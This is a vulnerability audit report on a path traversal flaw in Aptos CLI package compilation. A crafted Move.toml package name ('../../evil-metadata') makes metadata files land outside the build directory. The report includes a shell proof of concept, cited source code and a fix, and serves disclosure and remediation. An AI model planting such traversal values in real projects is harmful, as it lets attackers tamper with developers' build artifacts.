# Audit Report

## Title
Path Traversal in Move Package Compilation Allows Arbitrary File Write via Malicious Package Names

## Summary
The `CompilePackage::execute()` function's metadata extraction process is vulnerable to path traversal attacks through unvalidated package names in Move.toml manifests. When `save_metadata` is true, an attacker can craft a malicious package name (e.g., `../../evil`) to write files outside the designated build directory, potentially overwriting critical build artifacts or injecting malicious metadata into arbitrary locations on the file system.

## Finding Description
The vulnerability exists in the Move package compilation pipeline where package names from Move.toml manifests are used directly in file path construction without proper validation.

**Vulnerable Code Flow:**

1. The `CompilePackage::execute()` function calls `pack.extract_metadata_and_save()` when `save_metadata` is true: [1](#0-0) 

2. The `extract_metadata_and_save()` function constructs the output path using `package_artifacts_path()`: [2](#0-1) 

3. The `package_artifacts_path()` function directly joins the unsanitized package name: [3](#0-2) 

**Root Cause - Missing Validation:**

The legacy manifest parser defines `PackageName` as a simple type alias to `Symbol` without validation: [4](#0-3) 

During parsing, the package name is converted directly from a string using `Symbol::from()` without any character validation: [5](#0-4) 

This parser is invoked during package resolution: [6](#0-5) 

**Exploitation:**
An attacker creates a malicious `Move.toml`:
```toml
[package]
name = "../../malicious"
version = "1.0.0"
```

When compiled with `aptos move compile --save-metadata`, the path becomes:
- Input: `<package_dir>/build/../../malicious/package-metadata.bcs`
- Resolves to: `<package_dir>/../malicious/package-metadata.bcs`

This allows writing metadata files outside the build directory, bypassing the build system's isolation boundaries.

## Impact Explanation
This vulnerability is classified as **Medium severity** under the local file system security context:

**Direct Impact:**
- **Build Artifact Tampering**: Attackers can overwrite legitimate package metadata in sibling directories, corrupting the build environment for other packages
- **Metadata Injection**: Malicious metadata can be injected into arbitrary locations accessible to the compilation process
- **Supply Chain Risk**: Compromised build artifacts could propagate if developers unknowingly use tampered packages

**Scope Limitation:**
This is a **build-time** vulnerability affecting the Aptos CLI developer tooling, not the blockchain runtime. It does not directly impact:
- Consensus safety or blockchain state
- On-chain execution or validator operations  
- Network availability or funds security

However, it represents a supply chain security risk where compromised build artifacts during development could potentially lead to deployment of tampered packages if developers don't verify package integrity.

## Likelihood Explanation
**Likelihood: Medium-High**

**Attacker Requirements:**
- Ability to provide a malicious Move.toml to a developer (via social engineering, compromised repository, or supply chain attack)
- Target developer must compile the package with `--save-metadata` flag

**Ease of Exploitation:**
- Trivial to exploit - requires only a specially crafted Move.toml
- No special privileges required
- Works on all platforms (path traversal is cross-platform)

**Attack Scenarios:**
1. **Compromised Dependency**: Attacker publishes a package with malicious name to a package registry
2. **Social Engineering**: Developer clones a repository with malicious Move.toml
3. **Internal Sabotage**: Insider modifies Move.toml in a shared codebase

## Recommendation
Implement strict validation for package names during manifest parsing to prevent path traversal:

**Fix Location:** `third_party/move/tools/move-package/src/source_package/manifest_parser.rs`

**Solution:**
Replace the unvalidated `Symbol::from()` conversion with the validated `PackageName` type from the `move-package-manifest` crate. The validated type enforces: [7](#0-6) 

**Additional Hardening:**
1. Canonicalize all output paths before writing files
2. Verify that resolved paths remain within the intended build directory
3. Add runtime checks in `package_artifacts_path()` to detect path traversal attempts

## Proof of Concept

**Step 1: Create malicious Move package**
```bash
mkdir -p /tmp/poc-package
cd /tmp/poc-package
```

**Step 2: Create malicious Move.toml**
```bash
cat > Move.toml << 'EOF'
[package]
name = "../../evil-metadata"
version = "1.0.0"

[dependencies]
AptosFramework = { git = "https://github.com/aptos-labs/aptos-framework.git", rev = "mainnet", subdir = "aptos-framework" }

[addresses]
test_addr = "_"
EOF
```

**Step 3: Create dummy Move source**
```bash
mkdir -p sources
cat > sources/test.move << 'EOF'
module test_addr::test {
    public fun dummy() {}
}
EOF
```

**Step 4: Compile with metadata extraction**
```bash
aptos move compile --save-metadata --skip-fetch-latest-git-deps
```

**Expected Result:**
The metadata file will be written to `/tmp/evil-metadata/package-metadata.bcs` instead of the expected location `/tmp/poc-package/build/../../evil-metadata/package-metadata.bcs`, demonstrating path traversal outside the build directory.

**Verification:**
```bash
# Check if metadata was written outside build directory
ls -la /tmp/evil-metadata/package-metadata.bcs
# Should exist at the traversed path, not in build/
```

## Notes
This vulnerability specifically affects the **Aptos CLI developer tooling** (`aptos move compile` command), not the blockchain runtime or on-chain execution. While it doesn't directly compromise consensus, validator operations, or on-chain state, it represents a **supply chain security risk** where compromised build artifacts during development could lead to deployment of packages with tampered metadata. The validated `PackageName` type exists in the codebase but is not used by the legacy manifest parser that handles standard Move.toml compilation.

### Citations

**File:** crates/aptos/src/move_tool/mod.rs (L442-443)
```rust
        if self.save_metadata {
            pack.extract_metadata_and_save()?;
```

**File:** aptos-move/framework/src/built_package.rs (L419-423)
```rust
    pub fn package_artifacts_path(&self) -> PathBuf {
        self.package_path
            .join(CompiledPackageLayout::Root.path())
            .join(self.name())
    }
```

**File:** aptos-move/framework/src/built_package.rs (L593-598)
```rust
    pub fn extract_metadata_and_save(&self) -> anyhow::Result<()> {
        let data = self.extract_metadata()?;
        let path = self.package_artifacts_path();
        std::fs::create_dir_all(&path)?;
        std::fs::write(path.join(METADATA_FILE_NAME), bcs::to_bytes(&data)?)?;
        Ok(())
```

**File:** third_party/move/tools/move-package/src/source_package/parsed_manifest.rs (L10-10)
```rust
pub type PackageName = Symbol;
```

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L124-127)
```rust
            let name = name
                .as_str()
                .ok_or_else(|| format_err!("Package name must be a string"))?;
            let name = PM::PackageName::from(name);
```

**File:** third_party/move/tools/move-package/src/lib.rs (L217-217)
```rust
        let manifest = manifest_parser::parse_source_manifest(toml_manifest)?;
```

**File:** third_party/move/tools/move-package-manifest/src/package_name.rs (L58-67)
```rust
fn is_valid_package_name(s: &str) -> bool {
    let mut chars = s.chars();

    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => (),
        _ => return false,
    }

    chars.all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}
```
